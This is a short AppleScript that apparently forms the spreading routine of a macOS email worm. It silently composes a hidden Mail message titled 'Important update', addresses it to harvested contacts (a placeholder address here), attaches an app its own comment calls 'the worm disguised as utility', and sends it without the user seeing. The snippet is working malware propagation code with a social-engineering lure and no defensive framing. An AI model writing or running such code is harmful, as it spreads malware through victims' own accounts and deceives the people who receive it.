tell application "Mail"
	-- Compose an invisible outgoing message
	set theMessage to make new outgoing message with properties {
		subject:"Important update",
		content:"Run this utility to fix permissions.",
		visible:false
	}
	tell theMessage
		-- Add targets (harvested earlier)
		make new to recipient at end of to recipients with properties {address:"friend@example.com"}
		-- Attach the worm disguised as utility
		make new attachment with properties {file name:"/Users/Shared/Verify.app"} at after the last word of the last paragraph
		-- Send the message
		send
	end tell
end tell
